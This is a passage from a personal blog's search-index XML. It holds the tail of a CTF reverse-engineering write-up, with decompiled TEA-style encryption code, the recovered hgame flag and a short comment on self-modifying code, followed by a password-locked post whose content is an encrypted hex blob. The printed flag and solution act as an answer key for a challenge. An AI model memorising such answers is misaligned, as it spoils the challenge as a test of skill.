&#x2F;&#x2F;63930b609a7da803<br>  &#125;<br>    return 0;<br>&#125;<br>_DWORD *__fastcall encrypt(__int64 a1, _DWORD *a2)<br>&#123;<br>  _DWORD *result; &#x2F;&#x2F; rax<br>  int v3; &#x2F;&#x2F; [rsp+10h] [rbp-10h]<br>  signed int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]<br>  signed int j; &#x2F;&#x2F; [rsp+18h] [rbp-8h]<br><br>  v3 &#x3D; 0;<br>  for ( i &#x3D; 0; i &lt;&#x3D; 31; ++i )<br>    v3 -&#x3D; 1640531527;<br>  for ( i &#x3D; 0; i &lt;&#x3D; 31; ++i )<br>  &#123;<br>    result &#x3D; (_DWORD *)2654435769LL;<br>    for ( j &#x3D; 0; j &lt;&#x3D; 3; j +&#x3D; 2 )<br>    &#123;<br>        result &#x3D; (_DWORD *)(4 * (j + 1LL) + a1);<br>      *result -&#x3D; (*(_DWORD *)(4LL * j + a1) + v3) ^ (16 * *(_DWORD *)(4LL * j + a1) + a2[2]) ^ ((*(_DWORD *)(4LL * j + a1) &gt;&gt; 5)<br>                                                                                              + a2[3]);<br>      *(_DWORD *)(a1 + 4LL * j) &#x3D; *(_DWORD *)(4LL * j + a1)<br>                                - ((*(_DWORD *)(4 * (j + 1LL) + a1) + v3) ^ (16 * *(_DWORD *)(4 * (j + 1LL) + a1) + *a2) ^ ((*(_DWORD *)(4 * (j + 1LL) + a1) &gt;&gt; 5) + a2[1]));<br>    &#125;<br>  v3 +&#x3D; 1640531527;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>hgame{781ef0676e13e54163930b609a7da803}<br>题目出的挺好的，加深了对smc的理解<br>还有一些加密算法也能复习一下</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>皮三宝のCTF之旅</title>
    <link href="/2019/02/20/hello-world/"/>
    <url>/2019/02/20/hello-world/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ec681603c51001febab7b33d57fa26ec0a6f36f4b159ac1457eaf70d86f5c0ee">1ffc8fe07dba719b7195eb9462a983d44ad78ae6017680d964852fb1ba496f60c204014e63108fab813f6f63d6a44e3586cb89dc91917d6423f9a3eab46dac078dc47fb7fbf6de4011b4752553a0d3f02a01e1ab2330d26d8eeee3bd93b06127273d405ff33d34a67509cfce149f80a75d24a0f969b7815e5ccc08bd7d2dc309d549fcd7f15933814f039a86cb83461161e108923a7a67ff1e92d94806ffbea5eaab6b1c5a4b63b422decd325a2448fb73aa359a319e9a7a6a2981eb14a2cf36c67a5c3a6e1ba78028c9549de1f354c4ddd5fcbf00c1969dab376fcba453234606fd68f088c5f6325589c3f92fea21f096f99968c5da454bee794fbb19946513cbece83b8e4111f88bdee00ee8d0bc90bed54b144b79cf3029c8f51b23ae94f3fd7f48659ea41095fe8be9bba25c42d0b3817ea72b1d069c7a9711fe913d650b1c2284f39ce23320acd0896a748236f30a57bf26bd532e8d3b421059657fe69e122e7e65624fe15ebd7124a597ca0a14c921648c75fadaf960b466e31deebb35811c9ecd3d5fdfea29d39b4945a5d87c6c7aa2aba28b4a90eb1320ad314e43aa59c8d69ac35a519ff9fe10c698b5b64f8c16783f5fa1a287085e925b6ed91d9d565c2531ba2534693809c3638b73342a4e2b945c6bf2e6e98deb7bbdc51ad6e4c06383771655e1e840d44f61fe35d7c2a6a0cf17c7d833b4d6d72a1162530c51a10244acb70c4bd8322cbe068e29ce3707f32e099ad58c9a448be38e372a61a38a88c46a8107b3d64cacdb5e0f9e62a8f6d838319d9786cc6bccb6493b2d4c00f98111fedaeaec7ac897d80b9e0762888a5127466aaee461568750ecbde9a2313db1418ae9057aa740d77c65c2425f026f1343e3ff14a6ec8478de286d75b5205d89d4aeba4a69e06362ad3d98b510cd242927ead9594794d56ef10676a0872d6239b3fd2635698fe2b6998b30bbd812f68f966594a6edba447a353ab4cb523219e3d37380eea5461febb2ab1dc8a129560d0a0404a486bde42762d196f0fe978306c94e21eb284cfcd8854d4659914b0d791c9d2b8e90a16de19dfc36d7554a3a4f306d9f862e24e85dd58269e23b514ed892a651b4e4a06a6e4a992d250fc0cbada09260899615a8cd4e7c813162c192a3e51262a91ddd180fd2eb6ace13a1b2cf49fd20087c05ecc228b83909c932162178a0c1d04bb8d5e09949fa17c333c541e53a6bb3617104d57b49748508647bae301ee36db00276d6194ae1327037b37c100790b9ffc3f3ea25d7f4054375e47c5c3a2956908c52ce101977e213bb792f0a8e0ffbf22bad89deba7a5be8329f7b96932ee2380b608beadc62f8c785581f5007b8ea4a6124d8f1d39290c3da379a77b482ab58a3ff92464bc3522620854c9a53ec455d22fde6045591605daa68d2cea91514ba29f88b06f6020291b58e47eee01bdf2cba9f54412163a04d64f053c5b0eded3e08b04b00deaff858f98ed86c53e3f629b31b7eebd1e5ed5cc8bcca1b4897f45618d1160215a4ee095150ae7c081ada765dd16edc3bf9dcd9adbc282fa4f1621600d3dba27483f1589ff207dc84d461a7906c097238177bc5b2382cd0279c2633e44c50ed18e6025547024a5e86b78ee4d42f734099a04e36cd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
